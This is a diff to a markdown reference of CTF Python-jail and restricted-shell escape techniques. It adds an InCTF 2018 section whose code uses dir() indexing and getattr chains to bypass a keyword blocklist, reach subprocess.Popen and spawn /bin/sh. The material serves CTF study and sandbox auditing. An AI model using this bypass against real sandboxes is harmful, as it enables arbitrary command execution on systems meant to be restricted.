@@ -28,6 +28,7 @@
 - [func_globals to Module Chain Traversal (PlaidCTF 2013)](#func_globals-to-module-chain-traversal-plaidctf-2013)
 - [Restricted Charset Number Generation (PlaidCTF 2013)](#restricted-charset-number-generation-plaidctf-2013)
 - [Multi-Stage Payload with Class Attribute Persistence (PlaidCTF 2013)](#multi-stage-payload-with-class-attribute-persistence-plaidctf-2013)
+- [dir() Attribute Lookup Escape Bypassing __class__ Blocklist (InCTF 2018)](#dir-attribute-lookup-escape-bypassing-__class__-blocklist-inctf-2018)
 - [Restricted vim Escape via K (man) to :!sh (TokyoWesterns CTF 4th 2018)](#restricted-vim-escape-via-k-man-to-sh-tokyowesterns-ctf-4th-2018)
 - [Python Name Mangling and Attribute Access (Tokyo Westerns 2017)](#python-name-mangling-and-attribute-access-tokyo-westerns-2017)
 - [Decorator-Based Escape (No Call, No Quotes, No Equals)](#decorator-based-escape-no-call-no-quotes-no-equals)
@@ -39,7 +40,7 @@
   - [Variations](#variations)
   - [Constraints Checklist for This Technique](#constraints-checklist-for-this-technique)
   - [When \_\_loader\_\_ Is Not Available](#when-__loader__-is-not-available)
-- [Quine + Context Detection for Code Execution (BearCatCTF 2026)](#quine-context-detection-for-code-execution-bearcatctf-2026)
+- [Quine + Context Detection for Code Execution (BearCatCTF 2026)](#quine--context-detection-for-code-execution-bearcatctf-2026)
 - [Restricted Character Repunit Decomposition (BearCatCTF 2026)](#restricted-character-repunit-decomposition-bearcatctf-2026)
 - [Python eval() Jail Escape via Tuple Injection (Codegate 2018)](#python-eval-jail-escape-via-tuple-injection-codegate-2018)
 - [Python f-string Config Injection via Stored eval (INShAck 2018)](#python-f-string-config-injection-via-stored-eval-inshack-2018)
@@ -630,3 +631,34 @@ exec(().__class__.__base__.__subclasses__()[-2].payload)
 **Key insight:** Restricted editors almost always leak via chained pagers and keyword lookups. Catalog every command that spawns a child process (`K`/`keywordprg`, `:grep`, `:make`, `gx` for URL open, `:Man`) before touching `:!`. If even one child process uses `less` or another escape-friendly pager without `LESSSECURE=1`, you have a shell.
 
 **References:** TokyoWesterns CTF 4th 2018 — writeup 10859; GTFOBins `vim`/`less`/`man` entries
+
+---
+
+## dir() Attribute Lookup Escape Bypassing __class__ Blocklist (InCTF 2018)
+
+**Pattern:** A sandbox substring-filters literal strings `__class__`, `__bases__`, `__subclasses__`, `eval`, and `import`, but `dir(obj)` is allowed and returns the attribute names as strings. Use `dir([])` to look up forbidden attribute names by index, then chain `getattr` calls to reach `object.__subclasses__()` without ever typing the blocked literals.
+
+```python
+# Blacklist: "__class__", "__subclasses__", "eval", "import", "exec"
+# Allowed: dir(), getattr(), list literals, integer literals
+
+# Step 1: find the index of "__class__" in dir([])
+# dir([]) == ['__add__', '__class__', '__contains__', ...]
+i_class = 1
+base_attr = 34           # index of "__subclasses__" in dir(getattr([], dir([])[1]))
+
+# Step 2: chain getattr with indexed dir() lookups
+cls       = getattr([],  dir([])[i_class])           # list.__class__
+base      = getattr(cls, dir(cls)[dir(cls).index("__base__")])   # object
+subs      = getattr(base, dir(base)[base_attr])()    # list of all classes
+
+# Step 3: find a useful class — often subprocess.Popen
+for klass in subs:
+    if "Popen" in getattr(klass, dir(klass)[dir(klass).index("__name__")]):
+        break
+klass(["/bin/sh", "-c", "cat flag"])
+```
+
+**Key insight:** `dir()` is a *data* function: it returns plain strings. A substring blocklist scanning the source never sees the blocked words because they are generated at runtime from attribute table bytes. Any Python jail that filters source text without AST walking is defeated by one layer of indirection — `dir`, `globals().get(key)`, or `vars(obj)[key]`. When auditing a jail, always ask: "does the filter see the literal or the *value*?". If it only sees the literal, `dir()` indexing is the shortest escape.
+
+**References:** InCTF 2018 — The Most Secure File Uploader, writeup 11528
